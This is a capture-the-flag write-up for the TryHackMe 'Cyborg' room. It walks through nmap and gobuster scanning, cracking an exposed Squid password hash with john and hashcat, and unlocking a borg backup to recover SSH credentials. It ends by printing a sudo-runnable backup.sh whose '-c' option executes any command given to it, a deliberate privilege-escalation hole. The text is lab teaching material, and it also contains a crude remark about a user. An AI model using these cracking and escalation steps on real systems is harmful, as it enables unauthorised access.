## Cyborg - Try Hack Me

## 1. Overveiw

**NMAP**
**Gobuster**
****
****
****
- Link to the machine: https://tryhackme.com/room/cyborgt8

## 2. Tasks
### 2.1 Scan the machine, how many ports are open?

```sh
export IP=10.10.36.161
```

First we do a **NMAP** scan:
```sh
nmap -sV -sC -oN nmap/initial $IP
```

This is the output of the nmap scan:
```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


### 2.2 What service is running on port 22?
SSH

### 2.3 What service is running on port 80?
http

### 2.4 What is the user.txt flag?
We start by running a **gobuster**. To run a **gobuster** scan we do the following:
```sh
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log
```

The output of the gobuster is as follows:
```sh
===============================================================
2020/09/22 04:34:51 Starting gobuster
===============================================================
/admin                (Status: 301) [Size: 312] [--> http://10.10.36.161/admin/]
/etc                  (Status: 301) [Size: 310] [--> http://10.10.36.161/etc/]
/server-status        (Status: 403) [Size: 277]
```

The /etc domain contains a squid folder, and in that we see two files: `passwd` and `squid.conf`. The passwd file contains a md5 hash i think:

Passwd: `music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`

Squid.conf: `auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users`


On the admin domain we can see a blog. The guy likes music, his name is Alex and he is a fucking brit.
There is also an archive button and we can download a archive.tar file. We extract it with the following command: `tar -xvf archive.tar` and it gives us a repository to dive into.

Trying to crack the hash with john gave us the following:
```sh
john --format=md5crypt --wordlist=/usr/share/dict/words hash.txt
zeppelins..études

john --format=md5crypt --wordlist= /usr/share/wordlists/rockyou.txt hash.txt
!@#$%..sss
```

John is utterly useless here, so we use hashcat instead. Here is what I did:
```sh
hashcat --force -a 0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
```

And what we got was the following password:
`squidward`

So we have the credentials - `music_archive:squidward`

So we look into the borgbackup stuff, maybe there is something we can use here. In the config file we have the following variables that look interesting:

id = ebb1973fa0114d4ff34180d1e116c913d73ad1968bf375babd0259f74b848d31

key = hqlhbGdvcml0aG2mc2hhMjU2pGRhdGHaAZ6ZS3pOjzX7NiYkZMTEyECo+6f9mTsiO9ZWFV
	L/2KvB2UL9wHUa9nVV55aAMhyYRarsQWQZwjqhT0MedUEGWP+FQXlFJiCpm4n3myNgHWKj
	2/y/khvv50yC3gFIdgoEXY5RxVCXhZBtROCwthh6sc3m4Z6VsebTxY6xYOIp582HrINXzN
	8NZWZ0cQZCFxwkT1AOENIljk/8gryggZl6HaNq+kPxjP8Muz/hm39ZQgkO0Dc7D3YVwLhX
	daw9tQWil480pG5d6PHiL1yGdRn8+KUca82qhutWmoW1nyupSJxPDnSFY+/4u5UaoenPgx
	oDLeJ7BBxUVsP1t25NUxMWCfmFakNlmLlYVUVwE+60y84QUmG+ufo5arj+JhMYptMK2lyN
	eyUMQWcKX0fqUjC+m1qncyOs98q5VmTeUwYU6A7swuegzMxl9iqZ1YpRtNhuS4A5z9H0mb
	T8puAPzLDC1G33npkBeIFYIrzwDBgXvCUqRHY6+PCxlngzz/QZyVvRMvQjp4KC0Focrkwl
	vi3rft2Mh/m7mUdmEejnKc5vRNCkaGFzaNoAICDoAxLOsEXy6xetV9yq+BzKRersnWC16h
	SuQq4smlLgqml0ZXJhdGlvbnPOAAGGoKRzYWx02gAgzFQioCyKKfXqR5j3WKqwp+RM0Zld
	UCH8bjZLfc1GFsundmVyc2lvbgE=


We use the following quero to extract the archives since we know the password:
```sh
borg extract ~/Documents/tryhackme/cyborg/web/home/field/dev/final_archive::music_archive
```

In the documents folkder we find his SSH password:
`alex:S3cretP@s3`




## 2.5 root.txt

Ok so we use `sudo -l` to see if there is anything we can run, and it is. The file is called backup.sh.

Here is the backup.sh script:
```sh
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
	case "${flag}" in
		c) command=${OPTARG};;
	esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd

```
